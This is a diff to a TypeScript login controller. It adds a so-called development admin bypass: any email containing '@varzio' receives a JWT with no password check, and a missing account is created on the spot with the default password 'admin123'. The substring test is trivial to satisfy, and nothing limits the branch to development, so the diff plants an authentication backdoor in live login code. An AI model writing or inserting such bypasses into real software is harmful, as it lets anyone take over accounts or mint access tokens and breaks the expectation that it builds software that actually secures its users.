@@ -213,6 +213,47 @@ export class AuthController {
 
     const { email, password } = req.body;
 
+    // Admin bypass for development: @varzio emails
+    const isVarzioAdmin = email && email.includes('@varzio');
+    
+    if (isVarzioAdmin) {
+      // Find or create admin user
+      let user = await UserModel.findByEmail(email);
+      
+      if (!user) {
+        // Create admin user on the fly
+        const hashedPassword = await bcrypt.hash(password || 'admin123', 10);
+        user = await UserModel.create({
+          email,
+          name: email.split('@')[0],
+          password: hashedPassword,
+        });
+        logger.info(`Admin user created: ${email}`);
+      }
+      
+      // Generate JWT token without password verification
+      const token = JWTService.generateToken(user);
+      logger.info(`Admin bypass login: ${email}`);
+      
+      // Return token and user data
+      return res.json({
+        success: true,
+        data: {
+          token,
+          user: {
+            id: user.id,
+            phoneNumber: user.phoneNumber,
+            email: user.email,
+            name: user.name,
+            createdAt: user.createdAt,
+          },
+        },
+        message: 'Admin login successful (development mode)',
+        timestamp: new Date().toISOString(),
+      });
+    }
+
+    // Regular user login flow
     // Check if user exists
     const user = await UserModel.findByEmail(email);
     if (!user) {
